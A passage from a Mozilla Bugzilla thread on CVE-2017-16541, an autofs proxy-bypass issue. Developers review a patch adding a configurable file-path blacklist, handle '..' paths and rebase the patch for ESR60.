&gt; &gt; +    mPath.Truncate();
&gt; &gt; +    return NS_ERROR_FILE_UNRECOGNIZED_PATH;
&gt; 
&gt; OK, this can't be here.  This was my main concern with the previous patch. 
&gt; This can potentially break things.  It definitely changes behavior, is not
&gt; behind the pref and definitely cannot be uplifted like this to ESR.</span >

Fair enough. Note that I kept some of the changes in AppendRelativeNativePath:
Append('.') does nothing.
Append('..') throws NS_ERROR_FILE_UNRECOGNIZED_PATH just like the windows implementation, and as specified in nsIFile.idl
I think the fact that it was accepted was a bug.

<span class="quote">&gt; Move these lines INSIDE FilePreferences::IsAllowedPath and do it ONLY when
&gt; there are names (prefixes) to be blacklisted or do the normalization as I do
&gt; in my base patch (you will need the normalizer be a template and derive from
&gt; TTokenizer&lt;chat_path_t&gt;, like #ifdef XPWIN typedef char16_t char_path_t;
&gt; #else typedef char char_path_t; #endif)</span >

I made the Normalizer a template instead.
We now build the fileBlacklist code on windows too, even though it does nothing.

<span class="quote">&gt; But I think this &quot;has special dir -&gt; throw&quot; approach if fine when off by
&gt; default.  
&gt; 
&gt; OTOH, note that paths get here likely already normalized, at least on
&gt; windows I could see that navigating to file:///c:/./././././././././././ is
&gt; file://c:/ when coming to InitWithPath, no idea where that happens, but I
&gt; made sure no smb request/lookup was triggered before InitWithPath was
&gt; entered for file://///share uris.</span >

I think this is done in nsLocalFile::Normalize().
However, on Linux it performs a call to the system realpath, which resolves relative paths and also links.

<span class="quote">&gt; then, just for case, remember that ':' is a directory delimiter on osx!</span >

I think this was in older OSX versions (from what I can find on Google).

<span class="quote">&gt; &#64;&#64; +576,5 &#64;&#64;
&gt; &gt; +  }
&gt; &gt; +
&gt; &gt; +  if (FindInReadable(NS_LITERAL_CSTRING(&quot;..&quot;), aFragment)) {
&gt; &gt; +    return NS_ERROR_FILE_UNRECOGNIZED_PATH;
&gt; &gt; +  }
&gt; 
&gt; same case as above.</span >

I'll keep this one around (to fix nsIFile.idl inconsistency) unless it breaks some tests.</pre></div><div class="change-set" id="c74"><div class="comment" data-id="13413902" data-no="74"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-74" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20402598_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20402598_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-74"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-74" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c74">Comment 74</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 16:13 PDT" data-time="1529449995">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-74">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-74" data-comment-id="13413902">Try run:
<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=96829d5130514aa993137ca87611f1c93309db82">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=96829d5130514aa993137ca87611f1c93309db82</a>

Georg, let me know if the attached patch is OK.
Note that it depends on Honza's patch from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">bug 1413868</a>.

A few notes about the patch:
In order to block file access to &quot;/net&quot; you should add a pref (name:&quot;network.file.path_blacklist&quot;, value:&quot;/net&quot;)
It does have one weakness: symlinks. For a given symlink A that is not blacklisted it is impossible to know if its target B is blacklisted or not.</pre><div class="activity"><div class="change">Flags: needinfo?(gk)</div></div></div><div class="change-set" id="c75"><div class="comment" data-id="13414039" data-no="75"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-75" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20402598_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20402598_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-75"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-75" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c75">Comment 75</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 17:50 PDT" data-time="1529455810">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-75">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-75" data-comment-id="13414039"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=0e7ccac3062adac2b2959a8daa2f59af71443adc">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=0e7ccac3062adac2b2959a8daa2f59af71443adc</a></pre></div><div class="change-set" id="c76"><div class="comment" data-id="13414042" data-no="76"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-76" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20402598_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20402598_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-76"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-76" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c76">Comment 76</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 17:52 PDT" data-time="1529455948">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-76">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8986337"
         class="attachment patch"
         data-id="8986337" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1412081-file-blacklist.patch">
      <meta itemprop="contentSize" content="28211">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8986337">
          <a class="link" href="attachment.cgi?id=8986337&amp;action=diff">
        <span id="att-8986337-description" itemprop="description">patch</span></a>
        — <a href="attachment.cgi?id=8986337&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="a20410016_415378"><div class="change" id="aa20410016_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a20410016_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a20410016_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a20410016_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 17:52 PDT" data-time="1529455950">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8986314&amp;action=edit"
           title="patch"
           class=""
        >Attachment #8986314</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c77"><div class="comment" data-id="13414062" data-no="77"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-77" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-77"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-77" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c77">Comment 77</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 18:00 PDT" data-time="1529456456">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-77">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-77" data-comment-id="13414062">(In reply to Valentin Gosu [:valentin] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c73">comment #73</a>) 
<span class="quote">&gt; &gt; &gt; +  if (FindInReadable(NS_LITERAL_CSTRING(&quot;..&quot;), aFragment)) {
&gt; &gt; &gt; +    return NS_ERROR_FILE_UNRECOGNIZED_PATH;
&gt; &gt; &gt; +  }
&gt; &gt; 
&gt; &gt; same case as above.
&gt; 
&gt; I'll keep this one around (to fix nsIFile.idl inconsistency) unless it
&gt; breaks some tests.</span >

Turns out it broke some tests. :)
test_bug1056939.js tested files that contained .. in them.
test_file_equality.js checks that appending . gives you a different file.

I filed <a class="bz_bug_link
          bz_status_NEW"
   title="NEW"
   href="/show_bug.cgi?id=1469737">bug 1469737</a> for this.

I also fixed the nsTArray_base leak at shutdown.</pre></div><div class="change-set" id="c78"><div class="comment" data-id="13414100" data-no="78"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-78" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-78"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-78" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c78">Comment 78</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 19:01 PDT" data-time="1529460084">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-78">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-78" data-comment-id="13414100"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=5c8aa5f4c6462af988a474d2df1878764d896dfe">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=5c8aa5f4c6462af988a474d2df1878764d896dfe</a></pre></div><div class="change-set" id="c79"><div class="comment" data-id="13414581" data-no="79"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-79" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a20410016_415378"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-79"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-79" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c79">Comment 79</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 03:24 PDT" data-time="1529490258">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-79">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-79" data-comment-id="13414581">(In reply to Valentin Gosu [:valentin] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c74">comment #74</a>)
<span class="quote">&gt; Try run:
&gt; <a rel="nofollow" href="https://treeherder.mozilla.org/#/">https://treeherder.mozilla.org/#/</a>
&gt; jobs?repo=try&amp;revision=96829d5130514aa993137ca87611f1c93309db82
&gt; 
&gt; Georg, let me know if the attached patch is OK.</span >

Do you have one rebased against ESR60 handy by chance? I get a bunch of conflicts in FilePreferences.cpp when trying to apply your patch. I'll try to resolve them but I am a bit nervous about the correctness of the result.

<span class="quote">&gt; Note that it depends on Honza's patch from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">bug 1413868</a>.
&gt; 
&gt; A few notes about the patch:
&gt; In order to block file access to &quot;/net&quot; you should add a pref
&gt; (name:&quot;network.file.path_blacklist&quot;, value:&quot;/net&quot;)
&gt; It does have one weakness: symlinks. For a given symlink A that is not
&gt; blacklisted it is impossible to know if its target B is blacklisted or not.</span >

What does that mean in practise? If an attacker is pointing to symlink A the proxy bypass we try to avoid is getting triggered?</pre><div class="activity"><div class="change">Flags: needinfo?(gk) &rarr; needinfo?(valentin.gosu)</div></div></div><div class="change-set" id="c80"><div class="comment" data-id="13414852" data-no="80"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-80" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a20410016_415378"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-80"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-80" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c80">Comment 80</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 06:07 PDT" data-time="1529500072">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-80">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-80" data-comment-id="13414852">This is too late for ESR52 at this point (we've already built the 52.9.0 RC and that's the last scheduled release for that branch). We still want this for Fx62 &amp; ESR 60.2, though.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=isnotempty">status-firefox61</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=equals&amp;v1=fix-optional">fix-optional</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=isnotempty">status-firefox-esr52</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=isnotempty">tracking-firefox-esr52</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=-">-</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=isnotempty">tracking-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=62%2B">62+</a></div></div></div><div class="change-set" id="c81"><div class="comment" data-id="13414856" data-no="81"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-81" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-81"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-81" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c81">Comment 81</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 06:09 PDT" data-time="1529500177">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-81">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-81" data-comment-id="13414856">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c79">comment #79</a>)
<span class="quote">&gt; (In reply to Valentin Gosu [:valentin] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c74">comment #74</a>)
&gt; &gt; Try run:
&gt; &gt; <a rel="nofollow" href="https://treeherder.mozilla.org/#/">https://treeherder.mozilla.org/#/</a>
&gt; &gt; jobs?repo=try&amp;revision=96829d5130514aa993137ca87611f1c93309db82
&gt; &gt; 
&gt; &gt; Georg, let me know if the attached patch is OK.
&gt; 
&gt; Do you have one rebased against ESR60 handy by chance? I get a bunch of
&gt; conflicts in FilePreferences.cpp when trying to apply your patch. I'll try
&gt; to resolve them but I am a bit nervous about the correctness of the result.</span >

I'll try to rebase it.

<span class="quote">&gt; &gt; Note that it depends on Honza's patch from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">bug 1413868</a>.
&gt; &gt; 
&gt; &gt; A few notes about the patch:
&gt; &gt; In order to block file access to &quot;/net&quot; you should add a pref
&gt; &gt; (name:&quot;network.file.path_blacklist&quot;, value:&quot;/net&quot;)
&gt; &gt; It does have one weakness: symlinks. For a given symlink A that is not
&gt; &gt; blacklisted it is impossible to know if its target B is blacklisted or not.
&gt; 
&gt; What does that mean in practise? If an attacker is pointing to symlink A the
&gt; proxy bypass we try to avoid is getting triggered?</span >

It means that if the attacker can create a symlink that points to B, or if the attacker is aware of A that points to B, they could potentially bypass the filter. That seems unlikely to me, but it's important to keep in mind.</pre></div><div class="change-set" id="c82"><div class="comment" data-id="13415312" data-no="82"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-82" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-82"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-82" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c82">Comment 82</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 09:20 PDT" data-time="1529511655">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-82">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8986493"
         class="attachment patch obsolete"
         data-id="8986493" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1412081-file-blacklist-esr60.patch">
      <meta itemprop="contentSize" content="29600">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8986493">
          <a class="link" href="attachment.cgi?id=8986493&amp;action=diff">
        <span id="att-8986493-description" itemprop="description">[ESR60]  patch</span></a> (obsolete)
        — <a href="attachment.cgi?id=8986493&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986493">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="c83"><div class="comment" data-id="13415322" data-no="83"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-83" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-83"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-83" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c83">Comment 83</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 09:24 PDT" data-time="1529511875">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-83">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-83" data-comment-id="13415322">Georg, here is ESR patch. I have yet to build it on Windows, but it passes all the test on Linux.
Also it seems I didn't properly fix the shutdown leak.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(valentin.gosu)</span></div></div></div><div class="change-set" id="c84"><div class="comment" data-id="13415789" data-no="84"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-84" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-84"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-84" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c84">Comment 84</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 12:15 PDT" data-time="1529522142">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-84">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-84" data-comment-id="13415789"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=9e2cb28aacca889ca1bab1d4db917322fcd831c7">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=9e2cb28aacca889ca1bab1d4db917322fcd831c7</a></pre></div><div class="change-set" id="c85"><div class="comment" data-id="13415830" data-no="85"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-85" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-85"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-85" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c85">Comment 85</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 12:40 PDT" data-time="1529523646">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-85">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-85" data-comment-id="13415830"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=3d99658ef575ab815ff16d5683d4d564367b0b11">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=3d99658ef575ab815ff16d5683d4d564367b0b11</a></pre></div><div class="change-set" id="c86"><div class="comment" data-id="13416180" data-no="86"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-86" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-86"
